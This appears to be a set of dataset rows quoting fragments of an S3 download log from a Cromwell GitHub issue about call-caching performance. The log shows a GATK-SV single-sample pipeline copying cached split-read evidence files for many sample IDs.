focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz; 1608597426322,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi; 1608597428681,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:132542,cache,cacheCopy,132542,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi; 1608597222742,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz; 1608597227140,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz; 1608597229301,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:78293,cache,cacheCopy,78293,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz.tbi; 1608597129434,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz; 1608597132184,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz; 1608597133659,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:52748,cache,cacheCopy,52748,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz.tbi; 1608597236161,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz; 1608597239225,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz; 1608597241175,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:81400,cache,cacheCopy,81400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz.tbi; 1608597263910,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-20/cacheCopy/SR00c.HG01060.txt.gz; 1608597266985,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz; 1608597268460,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:88886,cache,cacheCopy,88886,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz.tbi; 1608597557397,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz; 1608597560491,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz; 1608597562850,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:172707,cache,cacheCopy,172707,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz.tbi; 1608597527253,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz; 1608597529228,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz.tbi; 1608597531104,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:163310,cache,cacheCopy,163310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz.tbi; 1608597402775,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-68/cacheCopy/SR00c.HG02648.txt.gz; 1608597404588,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz.tbi; 1608597406434,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:126294,cache,cacheCopy,126294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi; 1608597544559,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi; 1608597545740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi; 1608597548876,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:168957,cache,cacheCopy,168957,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-50/cacheCopy/SR00c.HG02085.txt.gz.tbi; 1608597606470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597610071,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz; 1608597612565,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:185137,cache,cacheCopy,185137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz.tbi; 1608596962113,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz.tbi; 1608596964153,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz.tbi; 1608596966063,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:6594,cache,cacheCopy,6594,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
